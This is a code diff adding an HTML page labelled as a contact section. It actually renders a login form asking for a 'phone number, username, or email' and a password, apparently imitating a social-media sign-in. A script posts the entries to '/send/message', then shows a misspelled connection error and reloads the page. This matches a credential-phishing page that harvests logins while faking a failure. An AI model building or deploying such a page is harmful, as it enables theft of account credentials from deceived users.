@@ -1,0 +1,56 @@
+<link rel="stylesheet" href="stylesheets/index.css">
+
+<div class="contact" id="contact">
+    <div class="contact-Heading">
+        <img class="contactImg" src="images/one.png" alt="">
+    </div>
+    <div class="contact-Section">
+        <div class="contactLeft">
+            <div id="loadingPage" style="display: none;">
+                <div id='loadingCircle'>
+                </div>
+            </div>
+            <form action="/send/message" id="form" id="my-form" method="POST" class='contactForm'>
+                <input type="text" class="inputBox credential" name="name" placeholder="Phone number, username, or email" required>
+                <input type="password" class="inputBox credential" name="password" placeholder="Password" required>
+                <input type="submit" onclick="showLoading()" value="Login" class="submitBtn">
+            </form>
+        </div>
+
+        <div class="footer">
+            <img class="footerimg" src="images/two.png" alt="">
+        </div>
+
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/js/all.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    function showLoading() {
+        document.getElementById('loadingPage').style.display = 'block';
+        document.getElementById('form').style.display = 'none';
+        document.getElementById('my-form').submitBtn.disabled = true;
+        document.getElementById('my-form').submit(function() {
+            document.getElementById('loadingPage').style.display = 'none';
+            document.getElementById('form').style.display = 'block';
+            document.getElementById('my-form').submitBtn.disabled = false;
+        });
+    }
+    $('form').submit(function(event) {
+        event.preventDefault();
+        $.ajax({
+            type: 'POST',
+            url: '/send/message',
+            data: $('form').serialize(),
+            success: function(data) {
+                alert(data.message);
+                location.reload();
+            },
+            error: function(error) {
+                alert('We were connecting\nPlease try agin!');
+                location.reload();
+            }
+        });
+    });
+</script>
